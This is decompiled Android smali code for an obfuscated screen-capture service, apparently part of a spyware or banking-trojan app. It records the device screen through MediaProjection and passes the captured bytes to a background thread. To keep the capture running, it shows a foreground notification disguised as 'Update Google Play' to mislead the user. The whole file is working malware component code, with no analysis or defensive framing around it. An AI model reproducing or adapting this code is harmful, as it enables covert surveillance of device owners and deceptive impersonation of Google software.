.class public Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;
.super Landroid/app/Service;
.source ""


# instance fields
.field private byte:Lnaqsl/ebxcb/exu/API/Screenshot/fddo;

.field private case:I

.field private char:Landroid/content/Intent;

.field private else:Landroid/content/Context;

.field private fddo:Landroid/media/projection/MediaProjection;

.field private final for:Landroid/os/HandlerThread;

.field private goto:Landroid/app/Notification;

.field private ifdf:Landroid/hardware/display/VirtualDisplay;

.field private int:Landroid/os/Handler;

.field long:Landroid/content/Intent;

.field private new:Landroid/media/projection/MediaProjectionManager;

.field this:Lnaqsl/ebxcb/exu/int;

.field private try:Landroid/view/WindowManager;


# direct methods
.method public constructor <init>()V
    .registers 4

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    new-instance v0, Landroid/os/HandlerThread;

    const-class v1, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;

    invoke-virtual {v1}, Ljava/lang/Class;->getSimpleName()Ljava/lang/String;

    move-result-object v1

    const/16 v2, 0xa

    invoke-direct {v0, v1, v2}, Landroid/os/HandlerThread;-><init>(Ljava/lang/String;I)V

    iput-object v0, p0, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;->for:Landroid/os/HandlerThread;

    new-instance v0, Lnaqsl/ebxcb/exu/int;

    invoke-direct {v0}, Lnaqsl/ebxcb/exu/int;-><init>()V

    iput-object v0, p0, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;->this:Lnaqsl/ebxcb/exu/int;

    return-void
.end method

.method static synthetic fddo(Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;)V
    .registers 1

    invoke-direct {p0}, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;->int()V

    return-void
.end method

.method private for()V
    .registers 3
    .annotation build Landroid/annotation/TargetApi;
        value = 0x15
    .end annotation

    new-instance v0, Landroid/app/Notification$Builder;

    iget-object v1, p0, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;->else:Landroid/content/Context;

    invoke-direct {v0, v1}, Landroid/app/Notification$Builder;-><init>(Landroid/content/Context;)V

    const-string v1, "Info"

    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    move-result-object v0

    const-string v1, "Update Google Play"

    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setContentText(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    move-result-object v0

    const/high16 v1, 0x7f040000

    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setSmallIcon(I)Landroid/app/Notification$Builder;

    move-result-object v0

    invoke-virtual {v0}, Landroid/app/Notification$Builder;->build()Landroid/app/Notification;

    move-result-object v0

    iput-object v0, p0, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;->goto:Landroid/app/Notification;

    iget-object v0, p0, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;->goto:Landroid/app/Notification;

    const/16 v1, 0x26b2

    invoke-virtual {p0, v1, v0}, Landroid/app/Service;->startForeground(ILandroid/app/Notification;)V

    return-void
.end method

.method static synthetic ifdf(Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;)Landroid/hardware/display/VirtualDisplay;
    .registers 1

    iget-object p0, p0, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;->ifdf:Landroid/hardware/display/VirtualDisplay;

    return-object p0
.end method

.method private int()V
    .registers 11
    .annotation build Landroid/annotation/TargetApi;
        value = 0x15
    .end annotation

    :try_start_0
    iget-object v0, p0, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;->new:Landroid/media/projection/MediaProjectionManager;

    iget v1, p0, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;->case:I

    iget-object v2, p0, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;->char:Landroid/content/Intent;

    invoke-virtual {v0, v1, v2}, Landroid/media/projection/MediaProjectionManager;->getMediaProjection(ILandroid/content/Intent;)Landroid/media/projection/MediaProjection;

    move-result-object v0

    iput-object v0, p0, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;->fddo:Landroid/media/projection/MediaProjection;

    new-instance v0, Lnaqsl/ebxcb/exu/API/Screenshot/fddo;

    invoke-direct {v0, p0}, Lnaqsl/ebxcb/exu/API/Screenshot/fddo;-><init>(Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;)V

    iput-object v0, p0, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;->byte:Lnaqsl/ebxcb/exu/API/Screenshot/fddo;

    new-instance v0, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot$for;

    invoke-direct {v0, p0}, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot$for;-><init>(Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;)V

    iget-object v1, p0, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;->fddo:Landroid/media/projection/MediaProjection;

    const-string v2, "andshooter"

    iget-object v3, p0, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;->byte:Lnaqsl/ebxcb/exu/API/Screenshot/fddo;

    invoke-virtual {v3}, Lnaqsl/ebxcb/exu/API/Screenshot/fddo;->for()I

    move-result v3

    iget-object v4, p0, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;->byte:Lnaqsl/ebxcb/exu/API/Screenshot/fddo;

    invoke-virtual {v4}, Lnaqsl/ebxcb/exu/API/Screenshot/fddo;->fddo()I

    move-result v4

    invoke-virtual {p0}, Landroid/app/Service;->getResources()Landroid/content/res/Resources;

    move-result-object v5

    invoke-virtual {v5}, Landroid/content/res/Resources;->getDisplayMetrics()Landroid/util/DisplayMetrics;

    move-result-object v5

    iget v5, v5, Landroid/util/DisplayMetrics;->densityDpi:I

    const/16 v6, 0x9

    iget-object v7, p0, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;->byte:Lnaqsl/ebxcb/exu/API/Screenshot/fddo;

    invoke-virtual {v7}, Lnaqsl/ebxcb/exu/API/Screenshot/fddo;->ifdf()Landroid/view/Surface;

    move-result-object v7

    const/4 v8, 0x0

    iget-object v9, p0, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;->int:Landroid/os/Handler;

    invoke-virtual/range {v1 .. v9}, Landroid/media/projection/MediaProjection;->createVirtualDisplay(Ljava/lang/String;IIIILandroid/view/Surface;Landroid/hardware/display/VirtualDisplay$Callback;Landroid/os/Handler;)Landroid/hardware/display/VirtualDisplay;

    move-result-object v1

    iput-object v1, p0, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;->ifdf:Landroid/hardware/display/VirtualDisplay;

    iget-object v1, p0, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;->fddo:Landroid/media/projection/MediaProjection;

    iget-object v2, p0, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;->int:Landroid/os/Handler;

    invoke-virtual {v1, v0, v2}, Landroid/media/projection/MediaProjection;->registerCallback(Landroid/media/projection/MediaProjection$Callback;Landroid/os/Handler;)V
    :try_end_4a
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_4a} :catch_4b

    goto :goto_57

    :catch_4b
    move-exception v0

    iget-object v1, p0, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;->this:Lnaqsl/ebxcb/exu/int;

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    const-string v2, "error"

    invoke-virtual {v1, v2, v0}, Lnaqsl/ebxcb/exu/int;->fddo(Ljava/lang/String;Ljava/lang/String;)V

    :goto_57
    return-void
.end method


# virtual methods
.method fddo()Landroid/os/Handler;
    .registers 2

    iget-object v0, p0, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;->int:Landroid/os/Handler;

    return-object v0
.end method

.method fddo([B)V
    .registers 3

    new-instance v0, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot$ifdf;

    invoke-direct {v0, p0, p1}, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot$ifdf;-><init>(Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;[B)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method ifdf()Landroid/view/WindowManager;
    .registers 2

    iget-object v0, p0, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;->try:Landroid/view/WindowManager;

    return-object v0
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .registers 3
    .annotation build Landroid/annotation/TargetApi;
        value = 0x15
    .end annotation

    new-instance p1, Ljava/lang/IllegalStateException;

    const-string v0, ""

    invoke-direct {p1, v0}, Ljava/lang/IllegalStateException;-><init>(Ljava/lang/String;)V

    throw p1
.end method

.method public onCreate()V
    .registers 3
    .annotation build Landroid/annotation/TargetApi;
        value = 0x15
    .end annotation

    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    iput-object p0, p0, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;->else:Landroid/content/Context;

    const-string v0, "media_projection"

    invoke-virtual {p0, v0}, Landroid/app/Service;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/media/projection/MediaProjectionManager;

    iput-object v0, p0, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;->new:Landroid/media/projection/MediaProjectionManager;

    const-string v0, "window"

    invoke-virtual {p0, v0}, Landroid/app/Service;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/WindowManager;

    iput-object v0, p0, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;->try:Landroid/view/WindowManager;

    iget-object v0, p0, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;->for:Landroid/os/HandlerThread;

    invoke-virtual {v0}, Landroid/os/HandlerThread;->start()V

    new-instance v0, Landroid/os/Handler;

    iget-object v1, p0, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;->for:Landroid/os/HandlerThread;

    invoke-virtual {v1}, Landroid/os/HandlerThread;->getLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    iput-object v0, p0, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;->int:Landroid/os/Handler;

    return-void
.end method

.method public onDestroy()V
    .registers 1
    .annotation build Landroid/annotation/TargetApi;
        value = 0x15
    .end annotation

    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .registers 4
    .annotation build Landroid/annotation/TargetApi;
        value = 0x15
    .end annotation

    iput-object p0, p0, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;->else:Landroid/content/Context;

    iput-object p1, p0, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;->long:Landroid/content/Intent;

    invoke-virtual {p1}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object p2

    if-nez p2, :cond_39

    const/16 p2, 0x539

    const-string p3, "resultCode"

    invoke-virtual {p1, p3, p2}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result p2

    iput p2, p0, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;->case:I

    const-string p2, "resultIntent"

    invoke-virtual {p1, p2}, Landroid/content/Intent;->getParcelableExtra(Ljava/lang/String;)Landroid/os/Parcelable;

    move-result-object p1

    check-cast p1, Landroid/content/Intent;

    iput-object p1, p0, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;->char:Landroid/content/Intent;

    sget p1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 p2, 0x1a

    if-lt p1, p2, :cond_2e

    iget-object p1, p0, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;->this:Lnaqsl/ebxcb/exu/int;

    const-string p2, "Google"

    const-string p3, "Update Google Play Service"

    invoke-virtual {p1, p0, p2, p3}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/app/Service;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_31

    :cond_2e
    invoke-direct {p0}, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;->for()V

    :goto_31
    new-instance p1, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot$fddo;

    invoke-direct {p1, p0}, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot$fddo;-><init>(Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;)V

    invoke-virtual {p1}, Ljava/lang/Thread;->start()V

    :cond_39
    const/4 p1, 0x2

    return p1
.end method
